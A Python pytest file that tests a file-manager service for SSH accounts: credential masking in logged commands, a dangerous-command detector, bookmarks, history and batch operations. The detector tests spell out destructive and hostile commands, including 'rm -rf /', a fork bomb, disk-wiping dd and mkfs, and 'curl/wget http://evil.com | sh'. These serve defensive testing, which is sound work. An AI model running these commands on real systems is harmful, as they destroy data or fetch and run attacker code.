import json
from unittest.mock import MagicMock, patch

import pytest

from app.services.file_manager_service import Bookmark, FileManagerService, OperationRecord


@pytest.fixture
def service():
    with patch("app.services.file_manager_service._BOOKMARKS_FILE", "/tmp/nonexistent_bookmarks.json"):
        svc = FileManagerService()
        svc._operation_history.clear()
        svc._command_history.clear()
        svc._bookmarks.clear()
        return svc


class TestSanitizeCommand:
    def test_sanitize_password(self):
        result = FileManagerService._sanitize_command("mysql -u root password=secret123")
        assert "secret123" not in result

    def test_sanitize_dash_p(self):
        result = FileManagerService._sanitize_command("mysql -p mypassword")
        assert "mypassword" not in result

    def test_sanitize_no_match(self):
        result = FileManagerService._sanitize_command("ls -la")
        assert result == "ls -la"

    def test_sanitize_api_key(self):
        result = FileManagerService._sanitize_command("curl api_key=abc123")
        assert "abc123" not in result


class TestIsDangerousCommand:
    def test_rm_root(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf /")
        assert is_danger is True

    def test_rm_home(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -rf ~")
        assert is_danger is True

    def test_mkfs(self):
        is_danger, reason = FileManagerService._is_dangerous_command("mkfs.ext4 /dev/sda1")
        assert is_danger is True

    def test_dd_zero(self):
        is_danger, reason = FileManagerService._is_dangerous_command("dd if=/dev/zero of=/dev/sda")
        assert is_danger is True

    def test_fork_bomb(self):
        is_danger, reason = FileManagerService._is_dangerous_command(":(){ :|:& };:")
        assert is_danger is True

    def test_redirect_to_device(self):
        is_danger, reason = FileManagerService._is_dangerous_command("> /dev/sda")
        assert is_danger is True

    def test_wget_pipe_sh(self):
        is_danger, reason = FileManagerService._is_dangerous_command("wget http://evil.com | sh")
        assert is_danger is True

    def test_curl_pipe_sh(self):
        is_danger, reason = FileManagerService._is_dangerous_command("curl http://evil.com | sh")
        assert is_danger is True

    def test_safe_command(self):
        is_danger, reason = FileManagerService._is_dangerous_command("ls -la")
        assert is_danger is False

    def test_safe_rm(self):
        is_danger, reason = FileManagerService._is_dangerous_command("rm -f specific_file.txt")
        assert is_danger is False


class TestBookmarkManagement:
    def test_add_bookmark(self, service):
        bookmark = service.add_bookmark("test", "/home", "Home")
        assert bookmark.alias == "test"
        assert bookmark.path == "/home"

    def test_add_duplicate_bookmark_updates(self, service):
        service.add_bookmark("test", "/home", "Home")
        bookmark = service.add_bookmark("test", "/home", "Updated")
        assert bookmark.label == "Updated"

    def test_remove_bookmark(self, service):
        service.add_bookmark("test", "/home", "Home")
        result = service.remove_bookmark("test", "/home")
        assert result is True

    def test_remove_nonexistent_bookmark(self, service):
        result = service.remove_bookmark("test", "/home")
        assert result is False

    def test_list_bookmarks(self, service):
        service.add_bookmark("a1", "/home", "Home")
        service.add_bookmark("a2", "/var", "Var")
        bookmarks = service.list_bookmarks()
        assert len(bookmarks) == 2

    def test_list_bookmarks_by_alias(self, service):
        service.add_bookmark("a1", "/home", "Home")
        service.add_bookmark("a2", "/var", "Var")
        bookmarks = service.list_bookmarks(alias="a1")
        assert len(bookmarks) == 1


class TestOperationHistory:
    def test_record_operation(self, service):
        service._record_operation("test", "list", "/home", "success")
        history = service.get_operation_history()
        assert len(history) == 1

    def test_get_operation_history_by_alias(self, service):
        service._record_operation("a1", "list", "/home", "success")
        service._record_operation("a2", "list", "/var", "success")
        history = service.get_operation_history(alias="a1")
        assert len(history) == 1

    def test_operation_history_limit(self, service):
        for i in range(5):
            service._record_operation("test", "list", f"/path{i}", "success")
        history = service.get_operation_history(limit=3)
        assert len(history) == 3


class TestCommandHistory:
    def test_record_command(self, service):
        service._record_command("test", "ls", 0, "output", "")
        history = service.get_command_history()
        assert len(history) == 1

    def test_get_command_history_by_alias(self, service):
        service._record_command("a1", "ls", 0, "out", "")
        service._record_command("a2", "pwd", 0, "out", "")
        history = service.get_command_history(alias="a1")
        assert len(history) == 1

    def test_command_history_sanitized(self, service):
        service._record_command("test", "mysql -p secret", 0, "out", "")
        history = service.get_command_history()
        assert "secret" not in history[0].command


class TestFileOperationsWithMocks:
    @pytest.fixture
    def mock_deps(self, service):
        with patch.object(service, "_get_connection") as mock_get_conn, \
             patch.object(service, "_release_connection") as mock_release:
            mock_conn = MagicMock()
            mock_get_conn.return_value = mock_conn
            yield mock_conn, mock_get_conn, mock_release

    def test_list_directory(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.list_directory.return_value = []
            mock_perm = MagicMock()
            mock_perm.check_execute_access.return_value = True
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.list_directory("test", "/home")
            assert isinstance(result, list)

    def test_exec_command_dangerous(self, service, mock_deps):
        with pytest.raises(PermissionError, match="危险命令"):
            service.exec_command("test", "rm -rf /")

    def test_exec_command_safe(self, service, mock_deps):
        mock_conn, _, _ = mock_deps
        with patch.object(service, "_with_manager") as mock_with:
            mock_mgr = MagicMock()
            mock_mgr.exec_command.return_value = {"exit_code": 0, "stdout": "ok", "stderr": "", "command": "ls"}
            mock_perm = MagicMock()
            mock_with.return_value = (mock_conn, mock_mgr, mock_perm)
            result = service.exec_command("test", "ls")
            assert result["exit_code"] == 0

    def test_exec_batch_dangerous(self, service, mock_deps):
        with pytest.raises(PermissionError, match="危险命令"):
            service.exec_batch("test", ["ls", "rm -rf /"])

    def test_get_connection_nonexistent_account(self, service):
        with patch("app.services.file_manager_service.ssh_account_service") as mock_svc:
            mock_svc.get_account.return_value = None
            with pytest.raises(ValueError, match="不存在"):
                service._get_connection("nonexistent")


class TestBatchOperations:
    def test_batch_delete(self, service):
        with patch.object(service, "delete") as mock_delete:
            result = service.batch_delete("test", ["/a", "/b"])
            assert len(result) == 2
            assert all(r["success"] for r in result)

    def test_batch_delete_partial_failure(self, service):
        def side_effect(alias, path):
            if path == "/b":
                raise RuntimeError("fail")

        with patch.object(service, "delete", side_effect=side_effect):
            result = service.batch_delete("test", ["/a", "/b"])
            assert result[0]["success"] is True
            assert result[1]["success"] is False

    def test_batch_chmod(self, service):
        with patch.object(service, "chmod") as mock_chmod:
            result = service.batch_chmod("test", ["/a", "/b"], "755")
            assert len(result) == 2

    def test_batch_chmod_recursive(self, service):
        with patch.object(service, "chmod") as mock_chmod:
            result = service.batch_chmod("test", ["/a"], "755", recursive=True)
            mock_chmod.assert_called_with("test", "/a", "-R 755")
